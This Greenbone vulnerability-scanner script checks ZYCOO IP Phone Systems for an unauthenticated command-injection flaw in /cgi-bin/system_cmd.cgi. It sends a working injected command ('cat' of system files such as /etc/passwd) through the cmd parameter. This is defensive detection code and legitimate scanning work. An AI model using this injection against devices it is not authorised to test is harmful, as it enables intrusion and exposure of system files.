# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:zycoo:ip_phone_system";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106214");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2016-08-29 16:16:40 +0700 (Mon, 29 Aug 2016)");
  script_tag(name:"cvss_base", value:"9.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:N");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("ZYCOO IP Phone System RCE Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_zycoo_ip_phone_system_detect.nasl");
  script_mandatory_keys("zycoo_ipphonesystem/detected");

  script_tag(name:"summary", value:"ZYCOO IP Phone System is prone to a remote command execution
  (RCE) vulnerability");

  script_tag(name:"insight", value:"The script /cgi-bin/system_cmd.cgi doesn't validate input which leads
  to remote command execution.");

  script_tag(name:"impact", value:"An unauthenticated attacker can execute arbitrary OS commands which may
  lead to a complete compromise of the device.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40269/");

  script_tag(name:"vuldetect", value:"Tries to retrieve /etc/passwd.");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = "/cgi-bin/system_cmd.cgi?cmd='cat%20/" + file + "'";

  if(http_vuln_check(port: port, url: url, pattern: pattern, check_header: TRUE)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
